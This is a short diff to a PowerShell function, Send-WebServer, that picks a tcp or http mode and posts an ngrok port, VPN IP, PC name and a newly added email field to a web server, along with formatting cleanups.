@@ -224,24 +224,29 @@ function Send-WebServer {
     Write-Host "----------------Sending to Web Server-------------------------"
     if ($port -like "*tcp*") {
         $mode = "tcp";
-    }elseif($port -like "*http*"){
-        $mode ="http";
+    }
+    elseif ($port -like "*http*") {
+        $mode = "http";
     }
 
+
+    $email = $config.To
     if ($ipaddress -eq $null ) {
         $postParams = @{
-            ngrok = $port;
-            vpnIP = 'NULL';
+            ngrok    = $port;
+            vpnIP    = 'NULL';
             protocol = $mode;
-            pcName= $pcname;
+            pcName   = $pcname;
+            email    = $email;
         }
     }
     else {
         $postParams = @{
-            ngrok = $port;
-            vpnIP = $ipaddress;
+            ngrok    = $port;
+            vpnIP    = $ipaddress;
             protocol = $mode;
-            pcName= $pcname;
+            pcName   = $pcname;
+            email    = $email;
         }
     }
 
